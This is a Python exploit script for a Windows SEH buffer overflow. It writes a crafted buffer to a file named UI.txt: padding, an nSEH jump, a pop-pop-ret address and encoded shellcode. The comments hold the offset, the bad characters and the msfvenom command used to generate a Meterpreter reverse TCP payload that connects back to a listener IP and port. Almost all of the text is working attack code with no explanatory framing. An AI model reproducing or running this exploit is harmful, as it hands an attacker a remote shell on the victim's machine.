#SEH offset 588 41367441 pattern
#pop pop ret #100116fd
#[junk][nseh][seh][shellcode]
#badchars 00, 0a, 09, cc, 0d
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.31.1.111 LPORT=4444 -f c -b "\x00\x0A\x09\x0d\xcc" -e x86/shikata_ga_nai


file = "UI.txt"

shellcode ="\x90"*20
shellcode +=("\xbe\xa2\xa2\x1e\xec\xdb\xc1\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x54\x31\x77\x13\x83\xc7\x04\x03\x77\xad\x40\xeb\x10\x59\x06"
"\x14\xe9\x99\x67\x9c\x0c\xa8\xa7\xfa\x45\x9a\x17\x88\x08\x16"
"\xd3\xdc\xb8\xad\x91\xc8\xcf\x06\x1f\x2f\xe1\x97\x0c\x13\x60"
"\x1b\x4f\x40\x42\x22\x80\x95\x83\x63\xfd\x54\xd1\x3c\x89\xcb"
"\xc6\x49\xc7\xd7\x6d\x01\xc9\x5f\x91\xd1\xe8\x4e\x04\x6a\xb3"
"\x50\xa6\xbf\xcf\xd8\xb0\xdc\xea\x93\x4b\x16\x80\x25\x9a\x67"
"\x69\x89\xe3\x48\x98\xd3\x24\x6e\x43\xa6\x5c\x8d\xfe\xb1\x9a"
"\xec\x24\x37\x39\x56\xae\xef\xe5\x67\x63\x69\x6d\x6b\xc8\xfd"
"\x29\x6f\xcf\xd2\x41\x8b\x44\xd5\x85\x1a\x1e\xf2\x01\x47\xc4"
"\x9b\x10\x2d\xab\xa4\x43\x8e\x14\x01\x0f\x22\x40\x38\x52\x2a"
"\xa5\x71\x6d\xaa\xa1\x02\x1e\x98\x6e\xb9\x88\x90\xe7\x67\x4e"
"\xd7\xdd\xd0\xc0\x26\xde\x20\xc8\xec\x8a\x70\x62\xc5\xb2\x1a"
"\x72\xea\x66\xb6\x77\x7c\x25\x58\x79\x13\x5d\x65\x79\xfa\xc1"
"\xe0\x9f\xac\xa9\xa2\x0f\x0c\x1a\x03\xe0\xe4\x70\x8c\xdf\x14"
"\x7b\x46\x48\xbe\x94\x3f\x20\x56\x0c\x1a\xba\xc7\xd1\xb0\xc6"
"\xc7\x5a\x31\x36\x89\xaa\x30\x24\xfd\xca\xba\xb4\xfd\x66\xbb"
"\xde\xf9\x20\xec\x76\x03\x14\xda\xd8\xfc\x73\x58\x1e\x02\x02"
"\x69\x54\x34\x90\xd5\x02\x38\x74\xd6\xd2\x6e\x1e\xd6\xba\xd6"
"\x7a\x85\xdf\x19\x57\xb9\x73\x8f\x58\xe8\x20\x18\x31\x16\x1e"
"\x6e\x9e\xe9\x75\xed\xd9\x16\x0b\xd3\x41\x7f\xf3\x53\x72\x7f"
"\x99\x53\x22\x17\x56\x7c\xcd\xd7\x97\x57\x86\x7f\x1d\x39\x64"
"\xe1\x22\x10\x28\xbf\x23\x96\xf1\xd6\xad\x59\x06\xd7\x4f\x66"
"\xd0\xee\x25\xaf\xe0\x54\x35\x9a\x45\xfc\xdc\xe4\xda\xfe\xf4")





junk = "A"*584
nseh = "\xeb\x06\x90\x90"
seh = "\xfd\x16\x01\x10" #100116fd pop pop retn
nops = "\x90"*20

junk2 = "A"*1000




buffer = junk + nseh + seh + nops + shellcode + junk2


f = open(file, 'w')
f.write(buffer)
f.close()

